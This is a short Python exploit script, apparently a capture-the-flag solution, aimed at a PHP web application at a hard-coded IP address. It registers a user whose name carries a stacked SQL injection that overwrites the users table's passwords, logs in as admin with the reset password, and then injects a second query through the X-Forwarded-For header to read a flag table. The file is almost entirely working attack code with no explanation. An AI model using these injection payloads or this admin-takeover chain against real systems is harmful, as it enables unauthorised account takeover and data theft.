#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2018/12/29, 01:09
"""

import requests
import re
import random
import string
req = requests.Session()

URL = 'http://42.159.5.246:20002'


def register(u):
    data = {
        "username": u,
        "password": "123456"
    }
    res = req.post(URL+'/index.php?action=register', data=data)
    if res.status_code == 200:
        return True
    return False


def update():
    res = req.get(URL+'/index.php?action=buy&money=20')
    if res.status_code == 200:
        return True
    return False


def admin(u="admin"):
    data = {
        "username": u,
        "password": "9"
    }
    res = req.post(URL+'/index.php?action=login', data=data)
    if res.status_code == 200:
        return 1
    return 0


def randstr(n=10):
    return ''.join([str(random.choice("1234567890")) for i in range(n)])


def flag(pl):
    headers = {
        "X-Forwarded-For": pl
    }
    res = req.get(URL+'/index.php?Flag=a', headers=headers)
    if res.status_code == 200:
        html = res.content.decode("utf-8")
        print("[+] Flag : %s" % html[html.find('Logout</a>')+10:])
    return 0


if __name__ == '__main__':
    pl = '2;UPDATE SU_user SET password=md5(9);#'+randstr(2)
    pl2 = '1);SELECT Flag from Flag;#'
    if register(pl):
        if update():
            if admin():
                flag(pl2)
